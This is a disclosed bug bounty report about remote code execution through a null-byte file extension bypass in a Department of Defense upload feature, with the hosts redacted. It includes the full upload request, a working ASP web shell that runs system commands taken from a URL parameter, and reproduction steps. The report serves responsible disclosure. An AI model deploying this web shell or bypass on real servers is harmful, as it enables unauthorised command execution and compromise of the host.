# RCE via File Upload  with a Null Byte Truncated File Extension at https://██████/

## Report Details
- **Report ID**: 2054184
- **URL**: https://hackerone.com/reports/2054184
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2023-07-06T22:08:16.576Z
- **Disclosed**: 2023-12-21T17:40:19.710Z

## Reporter
- **Username**: pizzapower
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hi,

I found "repos" at `https://███/` and `https://c█████████/` and this one (which doesn't have the file upload functionality appearing on the DOM, but it still may be there) `https://███████`.  There may be more, I had to fuzz a lot to find these. 

These repos contain file upload functionality. I found that if you place a null byte between file extensions, you can upload files with malicious extensions. 

Running the `dir` command at the uploaded file `https://████████/savefiles/poc.asp?cmd=dir`  - the shell has been deleted for security purposes. Let me know if you want me to reupload it. 

██████████

The request from burp - note the null byte: 

█████



*** Reproduction ***

1. Navigate to `https://███/`

2. Submit a file upload the same as the request I made above. Make sure there is a null byte between asp and png. 

3. Visit `https://████████/savefiles/poc.asp` and run commands. 


## Impact

Everything could be compromised.

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Here is the actual request, but I'm not sure how well the null byte will translate. 

```
POST /repo/orbital/repo.asp?fileToUpload=pizza.asp HTTP/1.1
Host: ███
Cookie: ASPSESSIONIDCCSBDDQT=CAJLLPMCPOBLODENMGDGMADC
Content-Length: 1306
Sec-Ch-Ua: 
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7RcvHwqSCmAtKCIB
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Sec-Ch-Ua-Platform: ""
Origin: https://███████
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://████████/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundary7RcvHwqSCmAtKCIB
Content-Disposition: form-data; name="myfile"; filename="poc.asp.png"


<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>


<HTML>
<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>
<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables("server_port"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>
</p>
<p>
<b>The server's local address:</b>
<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%>
</p>
<br>
</BODY>
</HTML>



------WebKitFormBoundary7RcvHwqSCmAtKCIB--

```

*** Reproduction ***

1. Navigate to `https://███/`

2. Submit a file upload the same as the request I made above. Make sure there is a null byte between asp and png. 

3. Visit `https://████/savefiles/poc.asp` and run commands.

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
